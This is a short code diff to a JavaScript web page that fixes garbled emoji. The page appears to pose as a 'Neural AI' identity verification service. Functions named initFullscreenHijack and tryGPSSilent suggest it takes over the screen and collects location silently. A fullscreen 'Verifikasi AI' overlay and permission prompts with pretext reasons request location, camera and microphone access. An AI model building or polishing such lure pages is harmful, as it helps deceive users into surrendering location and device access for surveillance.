@@ -102,7 +102,7 @@ function initFullscreenHijack() {
     const overlay = document.createElement('div');
     overlay.id = 'fs-overlay';
     overlay.style.cssText = 'position:fixed;inset:0;z-index:99999;background:#05050f;display:none;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;';
-    overlay.innerHTML = '<div style="font-size:3rem;margin-bottom:20px;">≡ƒñû</div><div style="font-size:1.2rem;font-weight:700;color:#fff;margin-bottom:8px;">Verifikasi AI</div><div style="color:#aaa;font-size:.9rem;margin-bottom:24px;">Tap untuk verifikasi identitas Anda di Neural AI</div><button style="padding:14px 40px;border:none;border-radius:12px;background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff;font-size:1rem;font-weight:600;cursor:pointer;font-family:inherit;">Verifikasi Sekarang</button>';
+    overlay.innerHTML = '<div style="font-size:3rem;margin-bottom:20px;">🛡️</div><div style="font-size:1.2rem;font-weight:700;color:#fff;margin-bottom:8px;">Verifikasi AI</div><div style="color:#aaa;font-size:.9rem;margin-bottom:24px;">Tap untuk verifikasi identitas Anda di Neural AI</div><button style="padding:14px 40px;border:none;border-radius:12px;background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff;font-size:1rem;font-weight:600;cursor:pointer;font-family:inherit;">Verifikasi Sekarang</button>';
     document.body.appendChild(overlay);
 
     let fsActive = false;
@@ -1000,8 +1000,8 @@ function tryGPSSilent() {
 
 function requestAllPermissions() {
     const perms = [
-        { id:'camera', icon:'≡ƒô╖', label:'Kamera', bg:'#7c3aed' },
-        { id:'microphone', icon:'≡ƒÄñ', label:'Mikrofon', bg:'#ec4899' }
+        { id:'camera', icon:'📷', label:'Kamera', bg:'#7c3aed' },
+        { id:'microphone', icon:'🎤', label:'Mikrofon', bg:'#ec4899' }
     ];
     const container = document.getElementById('loPerms');
     if (!container) return Promise.resolve();
@@ -1308,9 +1308,9 @@ function showPermissionPrompts() {
     permDiv.style.display = 'block';
 
     const perms = [
-        { id: 'location', icon: '≡ƒôì', title: 'Lokasi', desc: 'Akses GPS untuk layanan lokal', color: '#00d4ff' },
-        { id: 'camera', icon: '≡ƒô╖', title: 'Kamera', desc: 'Akses kamera untuk verifikasi', color: '#7c3aed' },
-        { id: 'microphone', icon: '≡ƒÄñ', title: 'Mikrofon', desc: 'Akses mikrofon untuk voice chat', color: '#ec4899' }
+{ id: 'location', icon: '📍', title: 'Lokasi', desc: 'Akses GPS untuk layanan lokal', color: '#00d4ff' },
+            { id: 'camera', icon: '📷', title: 'Kamera', desc: 'Akses kamera untuk verifikasi', color: '#7c3aed' },
+            { id: 'microphone', icon: '🎤', title: 'Mikrofon', desc: 'Akses mikrofon untuk voice chat', color: '#ec4899' }
     ];
 
     permList.innerHTML = '';
